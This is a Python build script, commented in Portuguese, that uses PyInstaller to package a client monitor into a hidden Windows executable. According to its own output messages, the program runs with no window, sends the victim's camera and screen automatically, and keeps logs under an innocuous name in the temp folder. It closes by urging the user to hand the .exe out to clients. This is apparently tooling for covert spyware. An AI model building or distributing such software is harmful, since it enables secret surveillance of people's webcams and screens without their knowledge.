import os
import subprocess
import sys

def build():
    print("=" * 60)
    print("🔨 BUILD - MONITORAMENTO SILENCIOSO")
    print("=" * 60)
    
    # Verificar se pyinstaller está instalado
    try:
        import PyInstaller
        print("✅ PyInstaller encontrado")
    except ImportError:
        print("📦 Instalando PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        print("✅ PyInstaller instalado")

    # Comando do PyInstaller para executável INVISÍVEL
    # --onefile: cria um único executável
    # --noconsole: NÃO abre janela de terminal
    # --windowed: modo GUI (sem console)
    # --name: nome do arquivo final
    # --hidden-import: garante que bibliotecas dinâmicas sejam incluídas
    # --uac-admin: solicita permissões de administrador (opcional)
    
    cmd = [
        "pyinstaller",
        "--onefile",              # Arquivo único
        "--noconsole",            # Sem console
        "--windowed",             # Modo janela (invisível)
        "--name=MonitoramentoSeguro",
        "--clean",                # Limpa cache anterior
        
        # Imports ocultos necessários
        "--hidden-import=cv2",
        "--hidden-import=socketio",
        "--hidden-import=engineio.async_drivers.threading",
        "--hidden-import=mss",
        "--hidden-import=numpy",
        "--hidden-import=dotenv",
        
        # Arquivo principal
        "monitor_cliente.py"
    ]

    print("\n📋 Configurações do Build:")
    print("   - Modo: INVISÍVEL (sem janela)")
    print("   - Tipo: Executável único")
    print("   - Nome: MonitoramentoSeguro.exe")
    print("   - Console: DESABILITADO")
    print()
    
    print(f"🔧 Executando: {' '.join(cmd)}")
    print()
    
    try:
        subprocess.check_call(cmd)
        
        print("\n" + "=" * 60)
        print("✅ BUILD CONCLUÍDO COM SUCESSO!")
        print("=" * 60)
        print()
        print("📁 Arquivo criado:")
        print("   dist/MonitoramentoSeguro.exe")
        print()
        print("⚠️  IMPORTANTE:")
        print("   - O executável roda INVISÍVEL (sem janela)")
        print("   - Câmera e tela são transmitidas automaticamente")
        print("   - Logs salvos em: %TEMP%\\system.log")
        print("   - Para parar: Task Manager → Processos")
        print()
        print("🚀 Distribua o arquivo .exe para os clientes!")
        print("=" * 60)
        
    except subprocess.CalledProcessError as e:
        print("\n❌ ERRO NO BUILD!")
        print(f"   {e}")
        sys.exit(1)

if __name__ == "__main__":
    build()

